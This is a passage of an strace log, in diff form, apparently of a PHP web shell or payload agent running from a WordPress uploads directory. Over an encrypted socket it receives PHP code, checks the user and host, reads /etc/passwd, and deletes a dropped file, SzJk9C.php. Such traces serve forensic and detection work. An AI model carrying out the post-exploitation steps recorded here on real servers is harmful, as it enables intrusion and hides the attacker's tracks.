+recvfrom(11, " == 'udp') {\n      $sock = strea"..., 8192, MSG_DONTWAIT, NULL, NULL) = 5792
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 60000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "nt(\"Unknown resource type\"); bre"..., 8192, MSG_DONTWAIT, NULL, NULL) = 4530
+setitimer(ITIMER_PROF, {it_interval={tv_sec=0, tv_usec=0}, it_value={tv_sec=0, tv_usec=0}}, NULL) = 0
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 1 (in [11], left {tv_sec=0, tv_usec=317589})
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 1 (in [11], left {tv_sec=0, tv_usec=0})
+poll([{fd=11, events=POLLIN|POLLPRI|POLLERR|POLLHUP}], 1, 0) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "{", 1, MSG_PEEK, NULL, NULL) = 1
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 60000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "{>\341\224{>\341\224{>\341\224{>\341\224{>\341\224{>\341\224{>\340\377{>\341\224"..., 8192, MSG_DONTWAIT, NULL, NULL) = 387
+getpid()                                = 68
+getpid()                                = 68
+getpid()                                = 68
+sendto(11, "\210y\365\231\226\4\221i\316\206\271\325 \220\373&3\t\254\7\210y\365\231\210y\364\354\210y\365\230"..., 397, MSG_DONTWAIT, NULL, 0) = 397
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 1 (in [11], left {tv_sec=0, tv_usec=992868})
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 1 (in [11], left {tv_sec=0, tv_usec=0})
+poll([{fd=11, events=POLLIN|POLLPRI|POLLERR|POLLHUP}], 1, 0) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\241", 1, MSG_PEEK, NULL, NULL) = 1
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 60000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\241\304\\\302\277\27182\347;\20\216\t-R}\32\264\5\\\241\304\\\303\241\304\\\252\241\304\\\302"..., 8192, MSG_DONTWAIT, NULL, NULL) = 128
+sendto(11, "'\336M\3219\243)!a!\1\235\2177Cn\234\256\24O'\336M\320'\336L\371'\336M\320"..., 320, MSG_DONTWAIT, NULL, 0) = 320
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 1 (in [11], left {tv_sec=0, tv_usec=836929})
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 1 (in [11], left {tv_sec=0, tv_usec=0})
+poll([{fd=11, events=POLLIN|POLLPRI|POLLERR|POLLHUP}], 1, 0) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\273", 1, MSG_PEEK, NULL, NULL) = 1
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 60000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\273\256\3317\245\323\275\307\375Q\225{\23G\327\210\0\336\200\251\273\256\3316\273\256\331_\273\256\3317"..., 8192, MSG_DONTWAIT, NULL, NULL) = 128
+sendto(11, "%\225}\236;\350\31ncj1\322\215|s!\236\345$\0%\225}\237%\225}\346%\225}\237"..., 144, MSG_DONTWAIT, NULL, 0) = 144
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 1 (in [11], left {tv_sec=0, tv_usec=975942})
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 1 (in [11], left {tv_sec=0, tv_usec=0})
+poll([{fd=11, events=POLLIN|POLLPRI|POLLERR|POLLHUP}], 1, 0) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\4", 1, MSG_PEEK, NULL, NULL) = 1
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 60000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\4@'w\32=C\207B\277k;\254\251)\310\2770~\351\4@'v\4@\237\177\4@'w"..., 8192, MSG_DONTWAIT, NULL, NULL) = 4344
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 1 (in [11], left {tv_sec=0, tv_usec=0})
+poll([{fd=11, events=POLLIN|POLLPRI|POLLERR|POLLHUP}], 1, 0) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\6", 1, MSG_PEEK, NULL, NULL) = 1
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 60000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\6>&\216\261ED\306+\377 ;\303\16Yy\t\365T\302\346B<C7\351\23\375\25\267\374O"..., 8192, MSG_DONTWAIT, NULL, NULL) = 8192
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 1 (in [11], left {tv_sec=0, tv_usec=0})
+poll([{fd=11, events=POLLIN|POLLPRI|POLLERR|POLLHUP}], 1, 0) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\331", 1, MSG_PEEK, NULL, NULL) = 1
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 60000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\331Q\343,IK#\324\262c\375yn^\251\332\256M\315i\261j\212\234M\247h{U\221\355>"..., 8192, MSG_DONTWAIT, NULL, NULL) = 1944
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 1 (in [11], left {tv_sec=0, tv_usec=0})
+poll([{fd=11, events=POLLIN|POLLPRI|POLLERR|POLLHUP}], 1, 0) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\352", 1, MSG_PEEK, NULL, NULL) = 1
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 60000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\352uC\255\20\340\300\" \300:\322dp5\237[\356\343\356\306\301\5\211?\251U\330I\242\\\262"..., 8192, MSG_DONTWAIT, NULL, NULL) = 1448
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 1 (in [11], left {tv_sec=0, tv_usec=0})
+poll([{fd=11, events=POLLIN|POLLPRI|POLLERR|POLLHUP}], 1, 0) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "!", 1, MSG_PEEK, NULL, NULL) = 1
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 60000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "!\315UZ\371Q\\\25\325\327{\252\243\200Ih^Ed\367\341\f\327\26g\303\f\33\377\32\243R"..., 8192, MSG_DONTWAIT, NULL, NULL) = 1448
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 1 (in [11], left {tv_sec=0, tv_usec=0})
+poll([{fd=11, events=POLLIN|POLLPRI|POLLERR|POLLHUP}], 1, 0) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "H", 1, MSG_PEEK, NULL, NULL) = 1
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 60000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "H:\35C\262\25\16m~\312\251WR\2716DG\6\367\253i\f\315k\314\7L\4\321\245\222\322"..., 8192, MSG_DONTWAIT, NULL, NULL) = 2896
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 1 (in [11], left {tv_sec=0, tv_usec=0})
+poll([{fd=11, events=POLLIN|POLLPRI|POLLERR|POLLHUP}], 1, 0) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\26", 1, MSG_PEEK, NULL, NULL) = 1
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 60000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\26w\3113\320\233Z\200\232\363>p*\244\331\36\363\232\233D\323\r\367qe.6\3114\363\232P"..., 8192, MSG_DONTWAIT, NULL, NULL) = 4344
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 1 (in [11], left {tv_sec=0, tv_usec=0})
+poll([{fd=11, events=POLLIN|POLLPRI|POLLERR|POLLHUP}], 1, 0) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "Y", 1, MSG_PEEK, NULL, NULL) = 1
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 60000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "Y~\234XM\347\0o0\362\7*Q\264m\n\274\352>\364m\254\377\363+r\f\277\224\202y\236"..., 8192, MSG_DONTWAIT, NULL, NULL) = 4344
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 1 (in [11], left {tv_sec=0, tv_usec=0})
+poll([{fd=11, events=POLLIN|POLLPRI|POLLERR|POLLHUP}], 1, 0) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\363", 1, MSG_PEEK, NULL, NULL) = 1
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 60000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\363\210\313\37\310\241k]\33\272\226\2377|\337\306\316\236\241\30d\242\253\255X\313{\236\205e%\26"..., 8192, MSG_DONTWAIT, NULL, NULL) = 1448
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 1 (in [11], left {tv_sec=0, tv_usec=0})
+poll([{fd=11, events=POLLIN|POLLPRI|POLLERR|POLLHUP}], 1, 0) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "w", 1, MSG_PEEK, NULL, NULL) = 1
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 60000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "w\370\254d\366\244T\353\366\250\317[\35\35\271@\255\332\314\253\325\375\267\31\0\300\3379+\261mD"..., 8192, MSG_DONTWAIT, NULL, NULL) = 1448
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 1 (in [11], left {tv_sec=0, tv_usec=0})
+poll([{fd=11, events=POLLIN|POLLPRI|POLLERR|POLLHUP}], 1, 0) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\352", 1, MSG_PEEK, NULL, NULL) = 1
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 60000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\352\306\0160j\0361=\325\6\333\326\245\302\3=\17AG\20\25\2\206>\30\254\205\0\233\367\362\232"..., 8192, MSG_DONTWAIT, NULL, NULL) = 5792
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 1 (in [11], left {tv_sec=0, tv_usec=0})
+poll([{fd=11, events=POLLIN|POLLPRI|POLLERR|POLLHUP}], 1, 0) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\322", 1, MSG_PEEK, NULL, NULL) = 1
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 60000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\322f\223\48\372t\350\230\r\344aK\225t\215\202?\315?\334gF\366\2631\313)C\364\214\10"..., 8192, MSG_DONTWAIT, NULL, NULL) = 7240
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 1 (in [11], left {tv_sec=0, tv_usec=0})
+poll([{fd=11, events=POLLIN|POLLPRI|POLLERR|POLLHUP}], 1, 0) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\26", 1, MSG_PEEK, NULL, NULL) = 1
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 60000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\26\336\2679I\n\0\375T\242N\1\22\261\360\374\343%\233r\3\312\270\34#\20\345x\4\271\35\357"..., 8192, MSG_DONTWAIT, NULL, NULL) = 2248
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
+sendto(11, "brm\240|\17\tP$\215!\354\312\233c\37\331\0024>brm\241brl\10brm\241"..., 448, MSG_DONTWAIT, NULL, 0) = 448
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 1 (in [11], left {tv_sec=0, tv_usec=982559})
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 1 (in [11], left {tv_sec=0, tv_usec=0})
+poll([{fd=11, events=POLLIN|POLLPRI|POLLERR|POLLHUP}], 1, 0) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "/", 1, MSG_PEEK, NULL, NULL) = 1
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 60000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "/Uu\3441(\21\24i\2529\250\207\274{[\224%,z/Uu\345/Uu\274/Uu\344"..., 8192, MSG_DONTWAIT, NULL, NULL) = 112
+getcwd("/var/www/html/wp-content/uploads", 4096) = 33
+sendto(11, "7e\251\235)\30\315mq\232\345\321\237\214\247\"\214\25\360\0037e\251\2347e\25157e\251\234"..., 192, MSG_DONTWAIT, NULL, 0) = 192
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 1 (in [11], left {tv_sec=0, tv_usec=997272})
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 1 (in [11], left {tv_sec=0, tv_usec=0})
+poll([{fd=11, events=POLLIN|POLLPRI|POLLERR|POLLHUP}], 1, 0) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\263", 1, MSG_PEEK, NULL, NULL) = 1
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 60000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\263\214.1\255\361J\301\365sb}\33e \216\10\374w\257\263\214.0\263\214.i\263\214.1"..., 8192, MSG_DONTWAIT, NULL, NULL) = 112
+getuid()                                = 33
+open("/etc/passwd", O_RDONLY|O_CLOEXEC) = 12
+lseek(12, 0, SEEK_CUR)                  = 0
+fstat(12, {st_mode=S_IFREG|0644, st_size=919, ...}) = 0
+mmap(NULL, 919, PROT_READ, MAP_SHARED, 12, 0) = 0x7f85e3e19000
+lseek(12, 919, SEEK_SET)                = 919
+munmap(0x7f85e3e19000, 919)             = 0
+close(12)                               = 0
+sendto(11, "(\324\377\2026\251\233rn+\263\316\200=\361=\223\244\246\34(\324\377\203(\324\377\n(\324\377\203"..., 160, MSG_DONTWAIT, NULL, 0) = 160
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 1 (in [11], left {tv_sec=0, tv_usec=997388})
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 1 (in [11], left {tv_sec=0, tv_usec=0})
+poll([{fd=11, events=POLLIN|POLLPRI|POLLERR|POLLHUP}], 1, 0) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\251", 1, MSG_PEEK, NULL, NULL) = 1
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 60000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\251^\223\231\267#\367i\357\241\337\325\1\267\235&\22.\312\7\251^\223\230\251^\223\301\251^\223\231"..., 8192, MSG_DONTWAIT, NULL, NULL) = 112
+uname({sysname="Linux", nodename="245f54697878", ...}) = 0
+uname({sysname="Linux", nodename="245f54697878", ...}) = 0
+sendto(11, "\214\350\255f\222\225\311\226\312\27\341*$\1\243\3317\230\364\370\214\350\255g\214\350\255\216\214\350\255g"..., 256, MSG_DONTWAIT, NULL, 0) = 256
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 1 (in [11], left {tv_sec=0, tv_usec=996707})
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 1 (in [11], left {tv_sec=0, tv_usec=0})
+poll([{fd=11, events=POLLIN|POLLPRI|POLLERR|POLLHUP}], 1, 0) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "v", 1, MSG_PEEK, NULL, NULL) = 1
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 60000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "v\361\16\243h\214jS0\16B\357\336\30\0\34\315\201W=v\361\16\242v\361\16\313v\361\16\243"..., 8192, MSG_DONTWAIT, NULL, NULL) = 128
+sendto(11, "\300\23'\322\336nC\"\206\354k\236h\372)m{c~L\300\23'\323\300\23'\252\300\23'\323"..., 144, MSG_DONTWAIT, NULL, 0) = 144
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 1 (in [11], left {tv_sec=0, tv_usec=996449})
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 1 (in [11], left {tv_sec=0, tv_usec=0})
+poll([{fd=11, events=POLLIN|POLLPRI|POLLERR|POLLHUP}], 1, 0) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "a", 1, MSG_PEEK, NULL, NULL) = 1
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 60000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "a\255\321w\177\320\265\207'R\235;\311D\337\310\332\335\210\351a\255\321va\255\321/a\255\321w"..., 8192, MSG_DONTWAIT, NULL, NULL) = 112
+sendto(11, "\304\250\36\314\332\325z<\202WR\200lA\20s\177\330GR\304\250\36\315\304\250\36\264\304\250\36\315"..., 144, MSG_DONTWAIT, NULL, 0) = 144
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 1 (in [11], left {tv_sec=0, tv_usec=989892})
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 1 (in [11], left {tv_sec=0, tv_usec=0})
+poll([{fd=11, events=POLLIN|POLLPRI|POLLERR|POLLHUP}], 1, 0) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\277", 1, MSG_PEEK, NULL, NULL) = 1
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 60000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\277\233\325\f\241\346\261\374\371d\231@\27r\333\263\4\353\214\222\277\233\325\r\277\233\325T\277\233\325\f"..., 8192, MSG_DONTWAIT, NULL, NULL) = 112
+sendto(11, "\277\212\27\367\241\367s\7\371u[\273\27c\31H\4\372Ni\277\212\27\366\277\212\27\217\277\212\27\366"..., 144, MSG_DONTWAIT, NULL, 0) = 144
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 1 (in [11], left {tv_sec=0, tv_usec=904706})
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 1 (in [11], left {tv_sec=0, tv_usec=0})
+poll([{fd=11, events=POLLIN|POLLPRI|POLLERR|POLLHUP}], 1, 0) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\324", 1, MSG_PEEK, NULL, NULL) = 1
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 60000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\324\213\\\312\312\3668:\222t\20\206|bRuo\373\5T\324\213\\\313\324\213\\\242\324\213\\\312"..., 8192, MSG_DONTWAIT, NULL, NULL) = 128
+stat("SzJk9C.php", {st_mode=S_IFREG|0644, st_size=1114, ...}) = 0
+sendto(11, "\321x7\330\317\5S(\227\207{\224y\2219gj\10nF\321x7\331\321x7p\321x7\331"..., 192, MSG_DONTWAIT, NULL, 0) = 192
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 1 (in [11], left {tv_sec=0, tv_usec=997241})
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 1 (in [11], left {tv_sec=0, tv_usec=0})
+poll([{fd=11, events=POLLIN|POLLPRI|POLLERR|POLLHUP}], 1, 0) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "l", 1, MSG_PEEK, NULL, NULL) = 1
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 60000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "l\216\177\211r\363\33y*q3\305\304gq6\327\376&\27l\216\177\210l\216\177\341l\216\177\211"..., 8192, MSG_DONTWAIT, NULL, NULL) = 128
+unlink("SzJk9C.php")                    = 0
+sendto(11, "\32\r9L\4p]\274\\\362u\0\262\3447\363\241}`\322\32\r9M\32\r94\32\r9M"..., 144, MSG_DONTWAIT, NULL, 0) = 144
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 1 (in [11], left {tv_sec=0, tv_usec=997286})
+select(12, [11], [], [], {tv_sec=0, tv_usec=0}) = 1 (in [11], left {tv_sec=0, tv_usec=0})
+poll([{fd=11, events=POLLIN|POLLPRI|POLLERR|POLLHUP}], 1, 0) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\3", 1, MSG_PEEK, NULL, NULL) = 1
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 60000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\3\\\245C\35!\301\263E\243\351\17\253\265\253\374\270,\374\335\3\\\245B\3\\\245+\3\\\245C"..., 8192, MSG_DONTWAIT, NULL, NULL) = 128
+stat("SzJk9C.php", 0x7ffd088e3460)      = -1 ENOENT (No such file or directory)
+sendto(11, "\5c\366\231\33\36\222iC\234\272\325\255\212\370&\276\23\257\7\5c\366\230\5c\366\341\5c\366\230"..., 144, MSG_DONTWAIT, NULL, 0) = 144
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
+select(12, [11], [], [], {tv_sec=1, tv_usec=0}) = 0 (Timeout)
